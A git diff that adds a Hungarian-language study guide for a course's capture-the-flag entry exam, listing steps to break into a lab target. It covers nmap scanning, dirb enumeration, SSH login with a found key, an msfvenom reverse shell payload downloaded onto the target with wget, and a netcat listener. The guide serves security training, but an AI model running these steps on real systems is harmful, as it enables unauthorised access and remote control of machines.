@@ -298,3 +298,134 @@ burpsuite
 [Sándor Martin](https://drive.google.com/drive/folders/1pAPH6c5MFAJhJIpG6w88XulvNG5qrfBm)
 [Gyakorló videó 1](https://www.youtube.com/watch?v=mjCdsCnjMqY)
 [Gyakorló videó 2](https://youtu.be/Zts_x4AP9rc)
+
+# 🛠️ Beugró (CTF) Lépések – Apache + SSH + Reverse Shell
+
+## 🔍 1. Portok keresése `nmap`-pel
+
+```bash
+nmap -p 10000-20000 <targetIP>
+```
+
+- Kapsz **két portot**: az egyik egy **Apache (web)**, a másik **SSH**.
+- Teszteld őket böngészőben (http://<targetIP>:<port>):
+  - Ami **weboldalt** ad vissza, az az **Apache**.
+  - A másik az **SSH**.
+
+> **Jegyezd fel**:  
+> `Apache port = ...`  
+> `SSH port = ...`
+
+---
+
+## 🌐 2. Webes feltérképezés `dirb`-bel
+
+```bash
+dirb http://<targetIP>:<apachePORT>
+```
+
+- Itt fogsz találni egy olyan oldalt, amin egy név és egy hash található.
+- Egérrel **kijelölöd**, majd **jobb klikk → copy**.
+
+---
+
+## 🧾 3. Hash/Jelszó mentése kulcsfile-ba
+
+```bash
+nano key
+```
+
+- Beilleszted a vágólapról (jobb klikk → paste).
+- Mentés: `Ctrl + X`, majd `Enter`, `Enter` ha újra kéri.
+
+Ellenőrzés:
+
+```bash
+ls
+chmod 600 key
+ls -al
+```
+
+---
+
+## 🔐 4. SSH belépés kulccsal
+
+```bash
+ssh -i ./key -p <SSH port> <felhasználónév>@<targetIP>
+```
+
+- Ha ez nem működik (pl. ha jelszót kaptál a hash helyett), akkor keress rá, hogyan lehet jelszóval SSH-zni:
+
+```bash
+ssh -p <SSH port> <felhasználónév>@<targetIP>
+```
+
+---
+
+## 💣 5. Reverse shell létrehozása `msfvenom`-nal
+
+Új terminált nyitsz, az előző SSH terminált nyitva hagyod:
+
+```bash
+msfvenom -p linux/x64/shell_reverse_tcp LHOST=<sajátIP> LPORT=<apachePORT> -o a.bin
+python3 -m http.server <apachePORT>
+```
+
+- Böngészőbe:  
+  `http://<sajátIP>:<apachePORT>`  
+- Jobb klikk az `a.bin` fájlra → **Link másolása**.
+
+---
+
+## 📥 6. Payload letöltése targetre SSH-n keresztül
+
+SSH terminálban:
+
+```bash
+wget <kimásolt link> -O /tmp/a
+```
+
+- Ha jól sikerült, a Python szerver terminálban látszik a letöltés.
+- Zárd be a szervert:
+
+```bash
+Ctrl + C
+```
+
+---
+
+## 🧲 7. Hallgatás netcattel
+
+Python szerver terminál helyett most netcatet indítasz:
+
+```bash
+nc -lvnp <apachePORT>
+```
+
+---
+
+## 🧨 8. Payload futtatása a targeten
+
+Vissza SSH terminálra:
+
+```bash
+/tmp/a
+```
+
+- Ha mindent jól csináltál, **a netcat terminálban megjelenik a connection**.
+- Megvan a **beugró**! 🎉
+
+---
+
+## 🧭 Rövid összefoglalás lépésekben
+
+1. `nmap`-pel portkeresés (10000–20000)
+2. `dirb`-bel feltérképezed a webet → név+hash
+3. SSH kulcs/jelszó mentés, majd SSH login
+4. `msfvenom`-nal reverse shell payload
+5. `python3 -m http.server` a payload kiszolgálásához
+6. `wget`-tel letöltés a targetre
+7. `nc`-vel figyelés
+8. Targeten a payload futtatása → reverse shell
+
+---
